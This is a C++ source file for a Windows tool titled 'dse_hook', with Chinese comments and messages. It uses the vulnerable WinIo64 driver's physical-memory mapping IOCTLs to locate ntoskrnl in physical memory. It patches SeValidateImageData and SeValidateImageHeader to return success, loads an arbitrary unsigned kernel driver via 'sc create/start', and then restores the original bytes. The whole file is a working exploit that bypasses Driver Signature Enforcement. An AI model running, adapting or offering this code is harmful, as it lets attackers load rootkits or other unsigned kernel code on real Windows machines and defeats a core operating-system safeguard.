#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <map>

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

char se_validate_image_data_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
char se_validate_image_header_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

//SeValidateImageData
unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
//SeValidateImageHeader 
unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

char patch[6] = {
	0xB8, 0x00, 0x00, 0x00, 0x00,	// mov rax, 0
	0xC3				// ret
};

u64 driver_handle = -1;
char winio_path[FILENAME_MAX];

struct winio_packet
{
	u64 size;
	u64 phys_address;
	u64 phys_handle;
	u64 phys_linear;
	u64 phys_section;
};

u64 phys_map(winio_packet& packet)
{
	// 通过 DeviceIoControl 向驱动发送 IOCTL_MAP 请求，传递 winio_packet 结构体。
  // 该函数将物理地址映射到虚拟地址空间，并返回映射后的线性地址（虚拟地址）。
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
		return NULL;

	// 成功时返回映射后的虚拟地址（线性地址）
	return packet.phys_linear;
}

bool phys_unmap(winio_packet& packet)
{
	u32 bytes_returned;

	// 通过 DeviceIoControl 向驱动发送 IOCTL_UNMAP 请求，解除物理地址的映射。
	if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, &packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
		return false;

	return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{ // 创建并初始化 winio_packet
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	// 将物理地址映射到虚拟地址
	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	// 如果映射后的虚拟地址无效，返回 false
	if (IsBadReadPtr((void*)linear_address, 1))
		return false;

	// 输出映射信息
	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	// 从映射后的虚拟地址读取数据到缓冲区
	memcpy((void*)buf, (void*)linear_address, size);

	// 解除物理地址映射
	phys_unmap(packet);
	return true;
}


bool write_phys(u64 addr, u64 buf, u64 size)
{
	// 定义一个包结构，用于存储物理地址和大小
	winio_packet packet;
	packet.phys_address = addr; // 物理地址
	packet.size = size;// 写入的大小

	// 将物理地址映射到线性（虚拟）地址
	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	// 如果映射后的虚拟地址无法访问，返回 false
	if (IsBadReadPtr((void*)linear_address, 1))
		return false;

	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	// 将缓冲区中的数据复制到映射后的虚拟地址
	memcpy((void*)linear_address, (void*)buf, size);

	// 解除物理地址的映射
	phys_unmap(packet);
	return true;
}

u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
	// 为物理内存分配缓冲区，大小为 range
	u64 buf = (u64)malloc(range);
	// 读取指定范围的物理内存
	read_phys(start, (u64)buf, range);

	u64 result = 0;// 默认返回值，表示未找到
	for (int i = 0; i < range; i++)
	{
		bool vtn = true;// 标记是否匹配
		for (int j = 0; j < pattern_length; j++)
		{
			// 如果模式字节不为 0x00 且与当前缓冲区字节不匹配
			if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
			{
				vtn = false;// 标记为不匹配
			}
		}

		// 如果所有字节匹配
		if (vtn)
		{
			result = start + i;// 记录匹配的起始地址
			goto ret; // 跳转到返回部分，避免继续查找
		}
	}

ret:
	// 释放缓冲区
	free((void*)buf);
	return result;// 返回匹配的地址，若未找到则为 0
}

bool file_exists(const std::string path) {
	// 获取文件属性，返回一个 DWORD 类型的值
	DWORD v0 = GetFileAttributesA(path.c_str());

	// 如果文件属性获取成功，且该路径不是目录（0x00000010 是目录的标志）
	return v0 != -1 && !(v0 & 0x00000010);
}

void load_driver_lazy(const char* driver_name, const char* bin_path)
{
	// 动态分配内存，用于存储创建服务的命令行
	u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
	// 动态分配内存，用于存储启动服务的命令行
	u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
	// 构造 "sc create" 命令，创建一个内核驱动程序服务
	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
	// 构造 "sc start" 命令，启动刚才创建的服务
	sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
	system((char*)cmdline_create_buf);
	system((char*)cmdline_start_buf);
}

int main(int argc, char* argv[])
{
	printf("[*] dse_hook by emlinhax\n");

	// 检查参数数量和每个参数的长度
	if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2))
	{
		printf("[!] 使用方法: dse_hook.exe your_driver_name c:\\your_driver.sys\n");
		Sleep(1000);
		return -1;
	}

	if (!file_exists(argv[2]))
	{
		printf("[!] 找不到指定的驱动程序文件.");
		system("pause>NUL");
		return -2;
	}

LOAD_WINIO:
	printf("[*] 尝试打开 WinIo 设备驱动的句柄...\n");
	driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (driver_handle == -1)
	{
		// 获取当前目录路径
		GetCurrentDirectoryA(FILENAME_MAX, winio_path);
		strcat(winio_path, "\\WinIO64.sys");

		// 如果找不到 WinIo 驱动文件，提示并退出
		if (!file_exists(winio_path))
		{
			printf("[!] 找不到 WinIo 驱动文件。\n[!] 请确保 \"WinIO64.sys\" 在当前目录下。\n");
			system("pause>NUL");
			return -3;
		}

		// 如果 WinIo 驱动未正确卸载，尝试多次停止并删除
		system("sc stop winio_dse_hook >NUL");
		system("sc delete winio_dse_hook >NUL");

		// 加载 WinIo 驱动
		load_driver_lazy("winio_dse_hook", winio_path);
		goto LOAD_WINIO; // 重新尝试打开 WinIo 驱动
	}

	printf("[*] driver_handle: %p\n", driver_handle);

	// ####

	// 寻找 ntoskrnl.exe 的基地址
	printf("[*] 寻找 ntoskrnl.exe...\n");
	u64 ntos_base_pa = 0;
	for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
	{
		char* buf = (char*)malloc(2);
		read_phys(i, (u64)buf, 2);
		//检查 "MZ" 标记以确定是否为 PE 文件
		if (buf[0] == 'M' && buf[1] == 'Z')
		{
			ntos_base_pa = i;
			printf("[*] ntoskrnl.exe 基址: 0x%p\n", ntos_base_pa);
			break;
		}

		free(buf);
	}

	if (!ntos_base_pa)
	{
		printf("[!] 找不到 ntoskrnl.exe 基址。\n");
		system("pause>NUL");
		return -5;
	}

	// 找到目标的物理地址，进行补丁修复
	u64 se_validate_image_data_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_data_pattern, sizeof(se_validate_image_data_pattern));
	u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
	if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
	{
		printf("[!] 找不到模式匹配的地址。\n");
		system("pause>NUL");
		return -6;
	}

	// 保存原始的字节
	read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

	// 替换字节，进行补丁
	write_phys(se_validate_image_data_pa, (u64)&patch, sizeof(patch));
	write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));
	printf("[*] 补丁已应用，绕过验证例程。\n");

	// 启动目标驱动程序
	load_driver_lazy(argv[1], argv[2]);
	printf("[*] 驱动已加载！\n");

	// 恢复原始字节，取消补丁
	write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
	printf("[*] 恢复了验证例程。\n");

	// 卸载 WinIo 驱动
	system("sc stop winio_dse_hook >NUL");
	system("sc delete winio_dse_hook >NUL");
	printf("[*] 卸载了 WinIo 驱动。\n");

	printf("[*] 完成！\n");
	//system("pause");
	Sleep(1000);

	return 0;
}